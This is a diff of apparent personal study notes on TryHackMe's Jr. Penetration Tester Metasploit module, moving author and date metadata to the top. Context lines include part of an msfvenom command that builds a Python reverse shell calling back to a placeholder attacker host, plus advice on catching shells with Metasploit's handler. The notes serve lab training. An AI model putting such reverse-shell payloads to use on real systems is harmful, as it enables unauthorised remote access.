@@ -1,5 +1,8 @@
 # TryHackMe: Jr. Penetration Tester
 
+author:: Nathan Acks  
+date:: 2022-04-14
+
 ## Exploitation with Metasploit
 
 ### Scanning
@@ -88,8 +91,3 @@ LHOST=$ATTACKER_IP LPORT=$ATTACKER_PORT -f raw > rev_shell.py
 ```
 
 Use the `exploit/multi/handler` module in Metasploit to catch the shells produced using Msfvenom (note that you’ll need to use `set payload` to tell Metasploit *what* it’s catching!). We can catch both regular reverse shells and Meterpreter sessions this way.
-
-- - - -
-
-<span aria-hidden="true">👤</span> Nathan Acks  
-<span aria-hidden="true">📅</span> April 14, 2022
